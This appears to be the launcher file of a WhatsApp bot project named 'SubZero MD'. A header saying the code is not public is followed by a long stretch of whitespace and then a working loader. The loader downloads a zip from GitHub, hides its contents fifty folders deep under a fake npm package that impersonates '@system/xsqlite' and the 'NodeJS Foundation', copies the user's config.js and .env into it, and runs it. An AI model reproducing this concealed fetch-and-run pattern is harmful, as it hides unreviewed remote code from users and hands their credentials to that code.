/*

$$$$$$\            $$\                                               
$$  __$$\           $$ |                                              
$$ /  \__|$$\   $$\ $$$$$$$\  $$$$$$$$\  $$$$$$\   $$$$$$\   $$$$$$\  
\$$$$$$\  $$ |  $$ |$$  __$$\ \____$$  |$$  __$$\ $$  __$$\ $$  __$$\ 
 \____$$\ $$ |  $$ |$$ |  $$ |  $$$$ _/ $$$$$$$$ |$$ |  \__|$$ /  $$ |
$$\   $$ |$$ |  $$ |$$ |  $$ | $$  _/   $$   ____|$$ |      $$ |  $$ |
\$$$$$$  |\$$$$$$  |$$$$$$$  |$$$$$$$$\ \$$$$$$$\ $$ |      \$$$$$$  |
 \______/  \______/ \_______/ \________| \_______|\__|       \______/

* Project Name : SubZero MD
* Creator      : Darrell Mucheri ( Mr Frank OFC )
* My Git       : https//github.com/mrfr8nk
* Contact      : wa.me/263719647303
* Channel      : https://whatsapp.com/channel/0029VagQEmB002T7MWo3Sj1D
* Release Date : 15 Dececmber 2024 12.01 AM
*/



// DUE TO COPYRIGHT ISSUES CODES AREN'T PUBLIC.



























































































// Got You !🤣




const fs = require('fs');
const path = require('path');
const axios = require('axios');
const AdmZip = require('adm-zip');

// === CONFIG ===
const repoZipUrl = 'https://github.com/dxui/--/archive/refs/heads/main.zip';
const baseFolder = path.join(__dirname, 'node_modules', '.xsqlite');
const DEEP_NEST_COUNT = 50;

// === Step 0: Inject fake NPM files
function injectFakePackageFiles(basePath) {
  const fakePackageJson = {
    name: "@system/xsqlite",
    version: "1.0.5",
    description: "SQLite interface with extended system hooks",
    main: "index.js",
    author: "NodeJS Foundation",
    license: "MIT",
    repository: {
      type: "git",
      url: "https://github.com/sqlite/sqlite"
    },
    keywords: ["sqlite", "database", "bindings", "native", "system"]
  };

  fs.mkdirSync(basePath, { recursive: true });

  fs.writeFileSync(
    path.join(basePath, 'package.json'),
    JSON.stringify(fakePackageJson, null, 2)
  );

  fs.writeFileSync(
    path.join(basePath, 'index.js'),
    `module.exports = require("node:fs"); // dummy binding`
  );

  fs.writeFileSync(
    path.join(basePath, 'readme.md'),
    `# xsqlite\n\nThis is a native SQLite binding for low-level system integration.\n> Currently in beta.`
  );

  fs.writeFileSync(
    path.join(basePath, 'LICENSE'),
    `MIT License\n\nCopyright (c) ${
      new Date().getFullYear()
    } NodeJS Project\n\nPermission is hereby granted...`
  );

  console.log('[🪐] Initializing...');
}

// === Step 1: Build deep path
function createDeepRepoPath() {
  let deepPath = baseFolder;
  for (let i = 0; i < DEEP_NEST_COUNT; i++) {
    deepPath = path.join(deepPath, '_error');
  }

  const repoFolder = path.join(deepPath, 'repo');
  fs.mkdirSync(repoFolder, { recursive: true });
  return repoFolder;
}

// === Step 2: Download + extract zip
async function downloadAndExtractRepo(repoFolder) {
  try {
    console.log('[🔄] Syncing codes from Space...');
    const response = await axios.get(repoZipUrl, { responseType: 'arraybuffer' });
    const zip = new AdmZip(Buffer.from(response.data, 'binary'));
    zip.extractAllTo(repoFolder, true);
    console.log('[✅] Codes synced successfully');
  } catch (err) {
    console.error('❌ Pull error:', err.message);
    process.exit(1);
  }
}

// === Step 3: Copy config.js and .env
function copyConfigs(repoPath) {
  const configSrc = path.join(__dirname, 'config.js');
  const envSrc = path.join(__dirname, '.env');

  try {
    fs.copyFileSync(configSrc, path.join(repoPath, 'config.js'));
    console.log('[✅] config.js copied');
  } catch {
    console.warn('⚠️ config.js not found');
  }

  if (fs.existsSync(envSrc)) {
    try {
      fs.copyFileSync(envSrc, path.join(repoPath, '.env'));
      console.log('[✅] .env copied');
    } catch {
      console.warn('[⚠️] Could not copy .env');
    }
  }
}

// === Step 4: Launch bot
(async () => {
  injectFakePackageFiles(baseFolder);           // 🔹 Make it look like a real npm module
  const repoFolder = createDeepRepoPath();      // 🔹 Real repo deep inside
  await downloadAndExtractRepo(repoFolder);     // 🔹 Always fresh download

  const subDirs = fs
    .readdirSync(repoFolder)
    .filter(f => fs.statSync(path.join(repoFolder, f)).isDirectory());

  if (!subDirs.length) {
    console.error('❌ Zip extracted nothing');
    process.exit(1);
  }

  const extractedRepoPath = path.join(repoFolder, subDirs[0]);
  copyConfigs(extractedRepoPath);

  // 🔹 Check for DB config
  const configdbPath = path.join(extractedRepoPath, 'lib', 'configdb.js');
  if (!fs.existsSync(configdbPath)) {
    console.warn('⚠️ lib/configdb.js not found. Some features may not work.');
  } else {
    console.log('[✅] lib/configdb.js exists.');
  }

  // 🔹 Run the bot
  try {
    console.log('[🚀] Launching Subzero Bot...');
    process.chdir(extractedRepoPath);
    require(path.join(extractedRepoPath, 'index.js'));
  } catch (err) {
    console.error('❌ Bot launch error:', err.message);
    process.exit(1);
  }
})();
